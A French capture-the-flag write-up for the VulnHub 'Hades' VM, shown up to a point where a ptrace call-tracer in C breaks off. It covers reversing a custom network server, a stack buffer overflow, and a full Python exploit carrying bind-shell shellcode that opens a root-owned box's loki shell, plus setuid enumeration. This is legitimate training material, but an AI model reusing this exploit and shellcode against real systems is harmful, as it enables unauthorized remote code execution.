# Solution du challenge Hades

Introduction
------------

Voici le début d'un article qui devrait être long mais très intéressant.  

Début avril, *VulnHub* a lancé [une compétition baptisée Hades](http://vulnhub.com/entry/the-infernal-hades,61/) qui consiste en une machine virtuelle de CTF créée par *Lok\_Sigma*.  

L'objectif : récupérer une clé GPG sur la machine (elle est chiffrée et il faudra pourvoir la déchiffrer).  

Le challenge est présenté comme étant volontairement compliqué et la solution que vous trouverez çi-dessous devrait vous convainvre que c'était plutôt corsé :)  

Mise en place de la VM
----------------------

La machine virtuelle est une image VM Ware. Le système est configuré pour obtenir une adresse IP via DHCP.  

J'ai mis la configuration réseau en mode ponté (bridged).  

Si vous avez des difficultés, essayez de choisir "Moved" au lieu de "Copied" lors de l'importation de la VM.  

Knockin' on Hell's Door
-----------------------

Un scan de port TCP retourne deux ports ouverts dont l'un non-identifié :  

```plain
Nmap scan report for 192.168.1.53
Host is up (0.00016s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 1024 e1:47:74:6c:b5:9c:8b:76:fd:92:77:91:fa:e7:f4:ee (DSA)
| 2048 9c:a0:0b:f3:63:2e:8e:10:77:e9:a3:5a:dd:f1:6d:46 (RSA)
|_256 0b:8d:d1:bf:6e:b8:cf:99:38:64:f0:58:bb:3c:45:77 (ECDSA)
MAC Address: 00:0C:29:FD:E8:9D (VMware)
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=6.40%E=4%D=4/10%OT=22%CT=1%CU=36181%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=5346FCF5%P=x86_64-suse-linux-gnu)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=I%II=
OS:I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%
OS:O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W
OS:6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

65535/tcp open  unknown

SF-Port65535-TCP:V=6.40%I=7%D=4/10%Time=53470279%P=x86_64-suse-linux-gnu%r
SF:(NULL,55,"Welcome\x20to\x20the\x20jungle\.\x20\x20\nEnter\x20up\x20to\x
SF:20two\x20commands\x20of\x20less\x20than\x20121\x20characters\x20each\.\
--- snip ---
SF:it\n")%r(X11Probe,5C,"Welcome\x20to\x20the\x20jungle\.\x20\x20\nEnter\x
SF:20up\x20to\x20two\x20commands\x20of\x20less\x20than\x20121\x20character
SF:s\x20each\.\n\0Got\x20it\n");
```

Loki's playing tricks again
---------------------------

([réf](https://www.youtube.com/watch?v=zrcudY8-894))  

Lorsque l'on se connecte au port 65535 avec ncat, on voit que l'on a affaire à un programme home-made dont l'invite est la suivante :  

```plain
Welcome to the jungle.
Enter up to two commands of less than 121 characters each.
```

Le programme s'attend alors à ce que l'on tape deux commandes. Pour chacune il renvoie le message *"Got it"*.  

Après la saisie de ces deux commandes, la connexion reste ouverte. On peut alors envoyer autant de données que l'on souhaite, cela ne changera rien.  

Le programme est assez mystérieux car la notion de commande est très vague : commande bash, python, etc ?  

Après avoir tente de nombreux mots clés, on voit que ce n'est pas la solution.  

Le programme n'est pas non plus vulnérable aux formats strings. En revanche on comprend vite que le programme effectue deux read() (ou recv()) à la suite pour obtenir les données car si on envoie trop de données à la première commande on a deux fois le message *"Got it"* qui apparaît.  

Si l'on envoie encore plus de données, on remarque que le programme semble vulnérable à un buffer overflow. En effet, il ferme abruptement la connexion si on envoie 170 octets ou plus.
Les possibilités d'exploitation semblent bien mince car quand le programme crashe il ne se relance pas, rendant toute sorte d'attaque par force-brute (sur une adresse de retour par exemple) impossible. Il faut alors redémarrer la machine virtuelle :(  

De toute évidence, il y a une information importante ailleurs.  

Si on se connecte en SSH sur la machine virtuelle on a un message d'accueil pour le moins particulier : un énorme texte qui semble encodé en base 64.  

On copie le texte dans un fichier et on écrit un programme simple en Python pour décoder :  

```python
from base64 import b64decode

fd = open("b64.txt")
data = "".join(fd.read().split())
fd.close()
data = b64decode(data)
fd = open("out", "w")
fd.write(data)
fd.close()
```

Devinez quoi... le fichier s'avère être un binaire ELF :  

```plain
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
BuildID[sha1]=d241bcc0f0d75412c3fe834dd345732b59075c50, not stripped
```

Et si on fait un *strings*, qu'est-ce que l'on obtient ?  

```plain
/lib/ld-linux.so.2
Es+Y
__gmon_start__
libc.so.6
_IO_stdin_used
socket
strcpy
htons
strncpy
puts
listen
printf
bind
read
malloc
bzero
accept
__libc_start_main
write
GLIBC_2.0
PTRh
loki
 pwnf
[^_]
here
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
Received: %s
Got it
;*2$"
```

C'est bien le binaire derrière le port 65535 et il n'est pas strippé !  

Jetons un coup d’œil avec *Radare2* :  

```plain
$ radare2 loki_server 
 -- Use 'e' and 't' in Visual mode to edit configuration and track flags
[0x080485a0]> aa
[0x080485a0]> pdf@sym.main
|          ; DATA XREF from 0x080485b7 (fcn.080485a0)
/ (fcn) sym.main 352
|          0x080486f5    55           push ebp
|          0x080486f6    89e5         mov ebp, esp
|          0x080486f8    83e4f0       and esp, 0xfffffff0
|          0x080486fb    81ec90010000 sub esp, 0x190
|          0x08048701    c78424b5000. mov dword [esp+0xb5], 0x696b6f6c ;  0x696b6f6c 
|          0x0804870c    c78424b9000. mov dword [esp+0xb9], 0x6e777020 ;  0x6e777020 
|          0x08048717    66c78424bd0. mov word [esp+0xbd], 0x6465 ;  0x00006465 
|          0x08048721    c7042479000. mov dword [esp], 0x79 ;  0x00000079 
|          0x08048728    e8e3fdffff   call sym.imp.malloc
|             sym.imp.malloc(unk)
|          0x0804872d    89842488010. mov [esp+0x188], eax
|          0x08048734    c7442408000. mov dword [esp+0x8], 0x0
|          0x0804873c    c7442404010. mov dword [esp+0x4], 0x1 ;  0x00000001 
|          0x08048744    c7042402000. mov dword [esp], 0x2 ;  0x00000002 
|          0x0804874b    e840feffff   call sym.imp.socket
|             sym.imp.socket()
|          0x08048750    89842484010. mov [esp+0x184], eax
|          0x08048757    c7442404100. mov dword [esp+0x4], 0x10 ;  0x00000010 
|          0x0804875f    8d8424a4000. lea eax, [esp+0xa4]
|          0x08048766    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x080484d0 (fcn.080484c6)
|          0x08048769    e862fdffff   call sym.imp.bzero
|             sym.imp.bzero()
|          0x0804876e    c7842480010. mov dword [esp+0x180], 0xffff ;  0x0000ffff 
|          0x08048779    66c78424a40. mov word [esp+0xa4], 0x2 ;  0x00000002 
|          0x08048783    c78424a8000. mov dword [esp+0xa8], 0x0
|          0x0804878e    8b842480010. mov eax, [esp+0x180]
|          0x08048795    0fb7c0       movzx eax, ax
|          0x08048798    890424       mov [esp], eax
|          0x0804879b    e840fdffff   call sym.imp.htons
|             sym.imp.htons()
|          0x080487a0    66898424a60. mov [esp+0xa6], ax
|          0x080487a8    c7442408100. mov dword [esp+0x8], 0x10 ;  0x00000010 
|          0x080487b0    8d8424a4000. lea eax, [esp+0xa4]
|          0x080487b7    89442404     mov [esp+0x4], eax
|          0x080487bb    8b842484010. mov eax, [esp+0x184]
|          0x080487c2    890424       mov [esp], eax
|          0x080487c5    e896fdffff   call sym.imp.bind
|             sym.imp.bind()
|          0x080487ca    8984247c010. mov [esp+0x17c], eax
|          ; CODE (CALL) XREF from 0x080489bf (fcn.08048855)
|- loc.080487d1 516
|          0x080487d1    c7442404050. mov dword [esp+0x4], 0x5 ;  0x00000005 
|          0x080487d9    8b842484010. mov eax, [esp+0x184]
|          0x080487e0    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x08048580 (fcn.08048576)
|          0x080487e3    e898fdffff   call sym.imp.listen
|             sym.imp.listen()
|          0x080487e8    c7842474010. mov dword [esp+0x174], 0x10 ;  0x00000010 
|          0x080487f3    8d842474010. lea eax, [esp+0x174]
|          0x080487fa    89442408     mov [esp+0x8], eax
|          0x080487fe    8d842494000. lea eax, [esp+0x94]
|          0x08048805    89442404     mov [esp+0x4], eax
|          0x08048809    8b842484010. mov eax, [esp+0x184]
|          0x08048810    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x080484f0 (fcn.080484e6)
|          0x08048813    e8d8fcffff   call sym.imp.accept
|             sym.imp.accept()
|          0x08048818    89842478010. mov [esp+0x178], eax
|          0x0804881f    c7442408550. mov dword [esp+0x8], 0x55 ;  0x00000055 
|          0x08048827    c7442404688. mov dword [esp+0x4], str.Welcometothejungle. ;  0x08048a68 
|          0x0804882f    8b842478010. mov eax, [esp+0x178]
|          0x08048836    890424       mov [esp], eax
|          ; CODE (CALL) XREF from 0x08048550 (fcn.08048546)
|          0x08048839    e812fdffff   call sym.imp.write
|             sym.imp.write()
|          0x0804883e    8984247c010. mov [esp+0x17c], eax
|          0x08048845    c784248c010. mov dword [esp+0x18c], 0x0
\          0x08048850    e95c010000   jmp 0x80489b1 ; (fcn.080489b1)
```

Le programme effectue des opérations classiques pour un serveur : création de socket, bind(), listen() puis accep().  

On remarque aussi qu'il alloue 121 octets (0x79) sur le tas au tout début du programme ainsi que 400 octets (0x190) sur la pile.  

Il saute ensuite sur cette partie de code :  

```plain
[0x080485a0]> pdf@0x80489b1
/ (fcn) fcn.08048855 384
| .-------> 0x08048855    c7442404790. mov dword [esp+0x4], 0x79 ;  0x00000079 
|- fcn.080489b1 376
| |         0x0804885d    8d8424fb000. lea eax, [esp+0xfb]
| |         0x08048864    890424       mov [esp], eax
| |         0x08048867    e864fcffff   call sym.imp.bzero
| |            sym.imp.bzero()
| |         0x0804886c    c7442408790. mov dword [esp+0x8], 0x79 ;  0x00000079 
| |         0x08048874    8d8424fb000. lea eax, [esp+0xfb]
| |         0x0804887b    89442404     mov [esp+0x4], eax
| |         0x0804887f    8b842478010. mov eax, [esp+0x178]
| |         0x08048886    890424       mov [esp], eax
| |         ; CODE (CALL) XREF from 0x080484b0 (fcn.080484ac)
| |         0x08048889    e822fcffff   call sym.imp.read
| |            sym.imp.read()
| |         0x0804888e    8984247c010. mov [esp+0x17c], eax
| |         0x08048895    8d8424fb000. lea eax, [esp+0xfb]
| |         0x0804889c    89442404     mov [esp+0x4], eax
| |         0x080488a0    c70424bd8a0. mov dword [esp], str.Received__s ;  0x08048abd 
| |         ; CODE (CALL) XREF from 0x080484c0 (fcn.080484b6)
| |         0x080488a7    e814fcffff   call sym.imp.printf
| |            sym.imp.printf()
| |         0x080488ac    83bc248c010. cmp dword [esp+0x18c], 0x0
| |     ,=< 0x080488b4    7524         jne 0x80488da
| |     |   0x080488b6    c7442408790. mov dword [esp+0x8], 0x79 ;  0x00000079 
| |     |   0x080488be    8d8424fb000. lea eax, [esp+0xfb]
| |     |   0x080488c5    89442404     mov [esp+0x4], eax
| |     |   0x080488c9    8b842488010. mov eax, [esp+0x188]
| |     |   0x080488d0    890424       mov [esp], eax
| |     |   0x080488d3    e898fcffff   call sym.imp.strncpy
| |     |      sym.imp.strncpy()
| |    ,==< 0x080488d8    eb4e         jmp 0x8048928 ; (fcn.080489b1)
| |    |`-> 0x080488da    83bc248c010. cmp dword [esp+0x18c], 0x1
| |   ,===< 0x080488e2    7544         jne 0x8048928
| |   ||    0x080488e4    c7442408380. mov dword [esp+0x8], 0x38 ;  0x00000038 
| |   ||    0x080488ec    8d8424fb000. lea eax, [esp+0xfb]
| |   ||    0x080488f3    89442404     mov [esp+0x4], eax
| |   ||    0x080488f7    8d8424bf000. lea eax, [esp+0xbf]
| |   ||    0x080488fe    890424       mov [esp], eax
| |   ||    0x08048901    e86afcffff   call sym.imp.strncpy
| |   ||       sym.imp.strncpy()
| |   ||    0x08048906    c74424080a0. mov dword [esp+0x8], 0xa ;  0x0000000a 
| |   ||    0x0804890e    8d8424b5000. lea eax, [esp+0xb5]
| |   ||    0x08048915    89442404     mov [esp+0x4], eax
| |   ||    0x08048919    8d8424bf000. lea eax, [esp+0xbf]
| |   ||    0x08048920    890424       mov [esp], eax
| |   ||    0x08048923    e848fcffff   call sym.imp.strncpy
| |   ||       sym.imp.strncpy()
| |   ||    ; CODE (CALL) XREF from 0x080488d8 (fcn.08048855)
| |   ``--> 0x08048928    c7442404790. mov dword [esp+0x4], 0x79 ;  0x00000079 
| |         0x08048930    8d8424fb000. lea eax, [esp+0xfb]
| |         0x08048937    890424       mov [esp], eax
| |         0x0804893a    e891fbffff   call sym.imp.bzero
| |            sym.imp.bzero()
| |         0x0804893f    c7442408070. mov dword [esp+0x8], 0x7 ;  0x00000007 
| |         0x08048947    c7442404cb8. mov dword [esp+0x4], str.Gotit ;  0x08048acb 
| |         0x0804894f    8b842478010. mov eax, [esp+0x178]
| |         0x08048956    890424       mov [esp], eax
| |         0x08048959    e8f2fbffff   call sym.imp.write
| |            sym.imp.write()
| |         0x0804895e    8984247c010. mov [esp+0x17c], eax
| |         0x08048965    83bc248c010. cmp dword [esp+0x18c], 0x0
| |  ,====< 0x0804896d    7521         jne 0x8048990
| |  |      0x0804896f    c7442408790. mov dword [esp+0x8], 0x79 ;  0x00000079 
| |  |      0x08048977    8b842488010. mov eax, [esp+0x188]
| |  |      0x0804897e    89442404     mov [esp+0x4], eax
| |  |      0x08048982    8d44241b     lea eax, [esp+0x1b]
| |  |      0x08048986    890424       mov [esp], eax
| |  |      0x08048989    e8e2fbffff   call sym.imp.strncpy
| |  |         sym.imp.strncpy()
| | ,=====< 0x0804898e    eb19         jmp 0x80489a9 ; (fcn.080489b1)
| | |`----> 0x08048990    83bc248c010. cmp dword [esp+0x18c], 0x1
| |,======< 0x08048998    750f         jne 0x80489a9
| |||       0x0804899a    8d8424bf000. lea eax, [esp+0xbf]
| |||       0x080489a1    890424       mov [esp], eax
| |||       0x080489a4    e826fdffff   call sym.v2
| |||          sym.v2()
| |||       ; CODE (CALL) XREF from 0x0804898e (fcn.08048855)
| |``-----> 0x080489a9    8384248c010. add dword [esp+0x18c], 0x1
| |         ; CODE (CALL) XREF from 0x08048850 (unk)
| |         0x080489b1    83bc248c010. cmp dword [esp+0x18c], 0x1
| `=======< 0x080489b9    0f8e96feffff jle fcn.08048855
|           ; CODE (CALL) XREF from 0x080487d1 (unk)
|           0x080489bf    e90dfeffff   jmp loc.080487d1
|           0x080489c4    90           nop
|           0x080489c5    90           nop
|           0x080489c6    90           nop
|           0x080489c7    90           nop
|           0x080489c8    90           nop
|           0x080489c9    90           nop
|           0x080489ca    90           nop
|           0x080489cb    90           nop
|           0x080489cc    90           nop
|           0x080489cd    90           nop
|           0x080489ce    90           nop
|           0x080489cf    90           nop
|           ; DATA XREF from 0x080485ab (fcn.080485a0)
/ (fcn) sym.__libc_csu_fini 5
|           0x080489d0    55           push ebp
|           0x080489d1    89e5         mov ebp, esp
|           0x080489d3    5d           pop ebp
\           0x080489d4    c3           ret
```

On voit bien qu'un compteur est présent en esp+0x18c pour déterminer s'il s'agit de la première ou de la seconde commande.  

Des recopie sont faites différemment en fonction de sa valeur mais après calcul tout semble en ordre de ce côté (pas de faille).  

Regardons plutôt la fonction *v2* qui est appelée pour la seconde commande :  

```plain
[0x080485a0]> pdf@sym.v2
|          ; CODE (CALL) XREF from 0x080489a4 (fcn.08048855)
/ (fcn) sym.v2 38
|          0x080486cf    55           push ebp
|          0x080486d0    89e5         mov ebp, esp
|          0x080486d2    83ec48       sub esp, 0x48
|          0x080486d5    8b4508       mov eax, [ebp+0x8]
|          0x080486d8    89442404     mov [esp+0x4], eax
|          0x080486dc    8d45d2       lea eax, [ebp-0x2e]
|          0x080486df    890424       mov [esp], eax
|          0x080486e2    e819feffff   call sym.imp.strcpy
|             sym.imp.strcpy(unk, unk)
|          0x080486e7    c70424628a0. mov dword [esp], str.here ;  0x08048a62 
|          0x080486ee    e82dfeffff   call sym.imp.puts
|             sym.imp.puts()
|          0x080486f3    c9           leave
\          0x080486f4    c3           ret
```

Ici 72 octets (0x48) seulement sont réservés sur la pile. Qui plus est, la cible du *strcpy()* est stockée en ebp-0x2e donc le buffer fait uniquement 46 octets.  

On va lancer notre copie du serveur en local, l'attacher depuis *gdb* (voir [VulnImage](http://devloop.users.sourceforge.net/index.php?article80/solution-du-ctf-vulnimage)) et envoyer un buffer via ce code python :  

```python
#!/usr/bin/python
import socket
import time

target = '127.0.0.1'

s = socket.socket()
s.connect((target, 65535))
time.sleep(0.5)

# send first command
s.send("hello")
time.sleep(0.5)
# send second command
s.send("A" * 46 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4)
print "sent"
time.sleep(5)
s.close()
print "done"
```

Dans gdb on obtient ceci :  

```plain
Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) info reg
eax            0x5      5
ecx            0xffffffff       -1
edx            0xf76c9880       -143878016
ebx            0xf76c8000       -143884288
esp            0xffc6dfe0       0xffc6dfe0
ebp            0x42424242       0x42424242
esi            0x0      0
edi            0x0      0
eip            0x43434343       0x43434343
eflags         0x10282  [ SF IF RF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

Le registre eip a bien été écrasé par nos "C".  

Maintenant il nous faut trouver une adresse de retour valide. On a déjà vu qu'un brute-force était impossible.  

Utiliser l'adresse qui a été réservée par *malloc()* au tout début du programme semblait être une possibilité intéressante mais supposait deux conditions :  

* le heap doit avoir le flag exécutable ce qui n'est probablement pas le cas
* les adresses ne doivent pas être randomisées

Si les adresses ne sont pas randomisées alors on peut avoir un ordre d'idée de l'adresse retournée par le malloc(121) en début de programme (cette adresse ne changera pas énormément d'un système à un autre d'après mes tests persos).  

Evidemment il faut relancer la VM à chaque tentative. Malheureusement... ça n'a pas fonctionné.  

Voyons voir ce que ce programme a d'autre dans le ventre :  

```plain
$ nm loki_server
         U accept@@GLIBC_2.0
         U bind@@GLIBC_2.0
08049d14 A __bss_start
         U bzero@@GLIBC_2.0
08049d14 b completed.5730
08049d0c D __data_start
08049d0c W data_start
--- snip ---
         U strncpy@@GLIBC_2.0
08049d14 D __TMC_END__
0804868c T v0
0804869b T v1
080486cf T v2
         U write@@GLIBC_2.0
```

Intéressant ! En plus de la fonction vulnérable *v2*, le programme a des fonctions *v1* et *v0* qui sont sans doute des anciennes versions laissées dans le code.  

Qu'il y a t-il dans *v0* ?  

```plain
[0x080485a0]> pdf@sym.v0
/ (fcn) sym.v0 13
|          0x0804868c    55           push ebp
|          0x0804868d    89e5         mov ebp, esp
|          0x0804868f    a128000000   mov eax, [0x28]
|          0x08048694    83ec2c       sub esp, 0x2c
\          0x08048697    ffe4         jmp esp
```

Et que trouve t'on dans esp-0x2c ? (merci gdb)  

```plain
(gdb) x/s $esp-0x2c
0xffc6dfb4:     'A' <repeats 36 times>, "BBBBCCCCDD"
```

Bingo ! Le début de la seconde commande :)  

L'exploitation se fera par conséquent via l'envoi d'une seconde commande commençant par un shellcode suivit par l'adresse de retour qui sera 0x08048694 qui appellera un morceau de *v0* pour sauter sur le début du shellcode :)  

Ca nous laisse donc 50 octets pour mettre notre shellcode + les nops... argh !  

Si on regarde [sur shell-storm](http://www.shell-storm.org/shellcode/), trouver un shellcode network-aware de cette taille est mission impossible.  

La solution est alors de trouver par exemple où est stocké la première commande dans la pile et de sauter dessus depuis notre petit shellcode (seconde commande).  

Pour cela on modifie un peu notre programme de crash en Python : cette fois on y met un petit shellcode composé de breakpoints (0xCC).  

De cette manière on pourra chercher l'adresse de la première commande dans la pile en condition réelle (au lieu de faire des calculs pour savoir où l'on en est des push/pop).  

```python
#!/usr/bin/python
import socket
import time
import struct

target = '127.0.0.1'

s = socket.socket()
s.connect((target, 65535))
time.sleep(0.5)
# send first command
s.send("hello")
time.sleep(0.5)

#send second command
s.send("\xcc" * 50 + struct.pack("I", 0x08048694))
print "sent"
time.sleep(5)
s.close()
print "done"
```

Le lancement du programme lève un breakpoint dans gdb :  

```plain
Program received signal SIGTRAP, Trace/breakpoint trap.
0xfff7e165 in ?? ()
```

On trouve notre bonheur à esp+71 :  

```plain
(gdb) x/s $esp+71
0xfff7e1ab:     "hello"
```

Récapitulons à nouveau (car ça devient compliqué) :  

On envoie une première commande qui contiendra notre shellcode final ainsi que quelques nops pour la forme.  

On envoie une seconde commande qui commence par un petit shellcode qui saute vers la première commande et se continue par l'adresse de retour qui pointe sur *v0* qui saute vers le petit shellcode.  

Au final j'ai écrit l'exploit suivant (notez le "A" qui est juste là pour aligner l'adresse qui était décalée) :  

```python
#!/usr/bin/python
import socket
import struct
import time

target = '192.168.1.53'
shellcode = (
# bind port 11111 http://www.shell-storm.org/shellcode/files/shellcode-835.php
"\xe8\xff\xff\xff\xff\xc3\x5d\x8d\x6d\x4a\x31\xc0"
"\x99\x6a\x01\x5b\x52\x53\x6a\x02\xff\xd5\x96\x5b"
"\x52\x66\x68\x2b\x67\x66\x53\x89\xe1\x6a\x10\x51"
"\x56\xff\xd5\x43\x43\x52\x56\xff\xd5\x43\x52\x52"
"\x56\xff\xd5\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
"\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\xeb\x04\x5f\x6a\x66\x58\x89"
"\xe1\xcd\x80\x57\xc3\00"
)

nopsled = "\x90" * (120 - len(shellcode))
command1 = nopsled + shellcode

add_esp_71 = (
    "\x83\xc4\x47" # add esp, 71
    "\xff\xe4"     # jmp esp
)

nopsled = "\x90" * 20
ret_addr = struct.pack("I", 0x08048694) # sub esp, 0x2c && jmp esp
command2 = nopsled + add_esp_71 + ret_addr * 16

s = socket.socket()
s.connect((target, 65535))
time.sleep(0.5)
# send first command (shellcode)
s.send(command1)
time.sleep(0.5)
#send second command (jmp gadget + ret addr)
s.send("A"*1 + command2)
print "sent"
time.sleep(0.5)
s.close()
print "done"
```

On lance l'exploit et on se connecte au port 11111 :

```plain
$ ncat 192.168.1.53 11111 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.53:11111.
id
uid=1000(loki) gid=1000(loki) groups=1000(loki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

Loki pwned, première étape finie ! (j'avais prévenu que ça allait être long)  

Stealing Hades key
------------------

Une fois que l'on a récupéré un shell plus propre...  

```plain
loki@Hades:~$ ls -al
total 40
drwxr-xr-x 3 loki loki 4096 Mar 19 18:59 .
drwxr-xr-x 3 root root 4096 Mar 19 06:23 ..
-rw-r--r-- 1 root root   40 Mar 18 20:22 .bash_history
-rw-r--r-- 1 loki loki  220 Mar 19 06:23 .bash_logout
-rw-r--r-- 1 loki loki 3486 Mar 19 06:23 .bashrc
drwx------ 2 loki loki 4096 Mar 18 20:57 .cache
-rw-r--r-- 1 loki loki  675 Mar 19 06:23 .profile
-rwsr-sr-x 1 loki loki 7035 Mar 18 20:57 loki_server
-rw-r--r-- 1 root root   42 Mar 19 18:59 notes
loki@Hades:~$ cat .bash_history
Really?  Not that kind of challenge....
loki@Hades:~$ cat notes
AES 256 CBC
Good for you and good for me.
```

Dans la racine du système de fichier on trouve différents fichiers intéressants notamment un exécutable set-uid root et une clé en lecture pour root uniquement :  

```plain
loki@Hades:/$ ls -alR display_root_ssh_key/
display_root_ssh_key/:
total 280
drwxr-xr-x  2 root root   4096 Mar 18 20:31 .
drwxr-xr-x 23 root root   4096 Mar 19 17:27 ..
-rw-------  1 root root      1 Mar 19 19:38 counter
-rwsr-sr-x  1 root root 273048 Mar 18 20:31 display_key
loki@Hades:/$ ls -l key_file 
-r-------- 1 root root 9984 Mar 19 17:27 key_file
```

Une fois lancé, le programme *display\_key* demande un mot de passe. Après 3 tentatives infructueuses le binaire redémarre le système !  

Le fichier *counter* est vraisemblablement présent pour tenir à jour le nombre de tentatives.  

Ce programme semble aussi vulnérable à un buffer overflow et crashe si on rentre un mot de passe trop grand.  

Si on passe strings sur *display\_key* on trouve :  

```plain
CuX(
KH\9
9_<v0
PJXh
Bx4o
cat /root/.ssh/id_rsa
rt0oun
        Ready to danc
EE patword: 
FATAL
[k*nelRToldN/dev/ur5
jdom
mi^kv
```

On voit une commande intéressante mais pas de *"reboot"*. Le programme serait-il chiffré ? Si on lance *gcore* sur le programme alors qu'il tourne on retrouve bien "reboot" dans le dump.  

Contrairement à d'autres challenges, placer un exécutable à nous baptisé *reboot* dans le PATH n'a aucun résultat :(  

**EDIT :** il semble qu'en fait il était possible de simplement créer un binaire reboot... J'ai du faire une mauvaise manipulation... qu'importe, je vous offre une solution plus intéressante ;-)   

L'analyse se révèle particulièrement difficile car le programme est compilé en static (il pèse 267 Ko) et est bien entendu strippé !  

Qui plus est le programme a tendance à quitter trop tôt si on le lance depuis gdb. Il faut donc le lancer et s'attacher ensuite pour l'analyser dynamiquement.  

Par où commencer l'analyse de ce programme quand on ne sait pas où se trouve le main() ? Il y a deux écoles...  

**La méthode de l'école des "Petits Malins"** (celle que... je n'ai pas utilisé)  

Quand le programme tourne, en root on affiche son fichier maps (cat cat /proc/pid\_du\_programme/maps) :  

```plain
00c01000-00c02000 r-xp 00000000 08:02 614773                             /tmp/display_key
08048000-080ca000 r-xp 00000000 00:00 0 
080ca000-080cd000 rwxp 00000000 00:00 0 
0964a000-0966c000 rwxp 00000000 00:00 0                                  [heap]
f77b1000-f77b3000 rwxp 00000000 00:00 0 
f77b3000-f77b4000 r-xp 00000000 00:00 0                                  [vdso]
ffc3f000-ffc60000 rwxp 00000000 00:00 0                                  [stack]
```

On voit une section qui est vraisemblablement celle du code (exécutable, lecture, suffisamment longue) en 0x08048000.  

Ensuite depuis gdb on affiche les instructions (x/200i 0x08048000).  

Dans tout ce fatras on trouve des instructions caractéristiques d'un appel à main() :  

```plain
   0x8048157:   push   $0x804837b
   0x804815c:   call   0x80483f0
   0x8048161:   hlt
```

Bravo, l'adresse du main() est vraisemblablement 0x804837b, vous pouvez commencer votre analyse ici.  

**La méthode de l'école "Prise de tête mais on s'amuse quand même"** (celle que j'ai utilisé)  

Si on suit l'exécution du programme via *strace* on voit les appels systèmes utilisés.  

Mais ce serait mieux si on pouvait connaître les adresses depuis lesquels ils sont appelés (la suite de calls qui y mène).  

Le programme est compilé en statique, c'est à dire que les méthodes de la libc sont présentes à l'intérieur.  

Si le code appelle *printf()* à deux endroits différents alors la suite des call/ret jusqu'au syscall write sera la même et ne différera qu'au niveau du code de *display\_key*.  

J'ai décidé d'écrire un débugger basé sur *ptrace()* qui m'affiche les adresses des instructions qui suivent les ret à partir du moment où un syscall spécifique est appelé. En gros les adresses juste après le call.  

Le principal du code (la version plus complète [à télécharger ici](../persistent/data/documents/call_trace.c)) :  

```c
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

char *get_syscall_name(long syscall)
{
  switch(syscall) {
    case SYS_read:
      return "read";
    case SYS_write:
      return "write";
    default:
      return "unknown";
  }
}

int main(int argc, char *argv[])
{
  pid_t child;
  const int long_size = sizeof(long);

  if (argc < 2) {
    printf("Usage: %s progname\n", argv[0]);
    return -1;
  }

  child = fork();

  if (!child) {
    // invite le processus parent a tracer
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    execl(argv[1], argv[1], NULL);
  } else {
    int status;
    union u {
        long val;
        char chars[long_size];
    }data;
    struct user_regs_struct regs;
    long ins;
    int follow_syscall = 0;

    while (1) {
      // attend que le process fils soit bloque (pret a etre trace)
      wait(&status);

      if (WIFEXITED(status)) {
        // le process est termine, rien ne sert de continuer
        break;
      }

      if (!follow_syscall) {
        // continue l'execution jusqu'au prochain syscall
        ptrace(PTRACE_SYSCALL, child, NULL, NULL);
        follow_syscall = 1;
      } else {
        // on est sur un syscall, lire les registres
        ptrace(PTRACE_GETREGS, child, NULL, &regs);

        printf("[*] %s (%ld)\n", get_syscall_name(regs.orig_eax), regs.orig_eax);
        if (regs.orig_eax == -1) break;

        // ici on indique le syscall qui nous intéresse
        if (regs.orig_eax == SYS_read) {
          int i = 0;
          int after_ret = 0;

          while (i < 4) {
            ins = ptrace(PTRACE_PEEKTEXT, child, regs.eip, NULL);

            // instruction ret
            if ((ins & 0x000000FF) == 0xc3) {
              after_ret = 1;
              i++;
            }

            // next instruction
            ptrace(PTRACE_SINGLESTEP, child, NULL, NULL);
            wait(&status);
            ptrace(PTRACE_GETREGS, child, NULL, &regs);
            if (after_ret) {
              printf("post-ret [%d] EIP: 0x%08lx\n", i, regs.eip);
              after_ret = 0;
            }
            if (ins  == 0xffffffff) break;
          }
        }

